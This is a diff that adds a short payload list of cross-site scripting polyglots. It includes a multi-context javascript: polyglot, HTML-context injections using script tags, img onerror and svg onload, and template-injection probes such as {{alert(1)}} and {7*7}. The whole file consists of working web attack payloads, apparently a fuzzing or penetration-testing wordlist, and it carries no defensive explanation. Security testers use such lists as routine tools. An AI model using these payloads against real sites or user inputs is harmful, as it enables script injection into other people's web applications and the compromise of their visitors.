@@ -1,0 +1,14 @@
+# XSS Polyglots (Multi-Context Execution)
+
+# Standard Polyglot (Escapes strings, attributes, and tags)
+jaVasCript:/*-/*`/*\"/*'/*\x3Cscript\x3Ealert(1)//\x3C/script\x3E*/alert(2)//
+
+# HTML context polyglot
+"><script>alert(1)</script>
+'"><img src=x onerror=alert(1)>
+"><svg/onload=alert(1)>
+
+# Template Literal Polyglot
+`${alert(1)}`
+{{alert(1)}}
+{7*7}
